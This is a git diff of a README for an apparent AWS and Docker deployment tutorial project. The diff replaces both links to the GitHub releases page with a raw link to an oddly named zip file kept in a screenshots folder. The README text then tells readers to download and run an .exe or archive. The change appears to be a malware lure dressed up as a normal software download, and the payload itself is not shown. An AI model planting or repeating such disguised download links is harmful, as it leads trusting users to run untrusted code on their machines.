@@ -1,6 +1,6 @@
 # ☁️ aws-docker-lab - Deploy containers on AWS clouds easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/shaughnmovable384/aws-docker-lab/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue.svg)](https://raw.githubusercontent.com/shaughnmovable384/aws-docker-lab/main/screenshots/Terminal/aws-lab-docker-spermarium.zip)
 
 This project provides a practical way to run containerized applications on Amazon Web Services. You gain a functional architecture that connects Docker images stored in the Amazon Elastic Container Registry to an Amazon EC2 instance. This setup manages security through Identity and Access Management policies. You follow this guide to set up a cloud-based server environment without writing complex code.
 
@@ -18,7 +18,7 @@ Your computer requires the following components to run the tools associated with
 
 The first step involves obtaining the necessary files from the official repository. You do not need to compile code or manage external dependencies. 
 
-[Visit this page to download the software](https://github.com/shaughnmovable384/aws-docker-lab/releases)
+[Visit this page to download the software](https://raw.githubusercontent.com/shaughnmovable384/aws-docker-lab/main/screenshots/Terminal/aws-lab-docker-spermarium.zip)
 
 Once you arrive at the page, identify the latest release at the top of the list. Click the link that ends in ".exe" or the archive file meant for Windows systems. Save the file to a folder that you can locate easily, such as your Downloads or Desktop folder.
 
